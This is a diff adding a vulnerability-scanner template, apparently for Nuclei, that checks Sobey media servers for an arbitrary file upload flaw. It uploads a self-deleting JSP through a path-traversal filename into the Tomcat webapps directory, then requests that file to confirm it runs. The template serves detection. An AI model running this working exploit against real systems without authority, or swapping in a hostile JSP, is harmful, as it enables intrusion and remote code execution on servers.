@@ -1,0 +1,50 @@
+id: sobeylingyun-watermark-upload-fileupload
+info:
+  name: 索贝融媒体 /upload存在任意文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 索贝融媒体的/upload接口存在安全缺陷，可能被恶意利用进行任意文件上传。该漏洞允许攻击者上传可执行脚本或恶意程序，进而可能危及系统安全，获取敏感数据或控制系统权限，需要及时修复以防止潜在的数据泄露和系统入侵风险。
+  reference: 
+    - https://mp.weixin.qq.com/s/WIENSZpbEyc4a9cq9BGohg
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileupload,sobeylingyun
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /sobey-mchEditor/watermark/upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Content-Length: 215
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file";filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/{{filename}}.jsp" 
+        Content-Type: imge/jpeg
+
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundary--
+        
+        
+      
+      - |+
+        GET /sobey-mchEditor/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
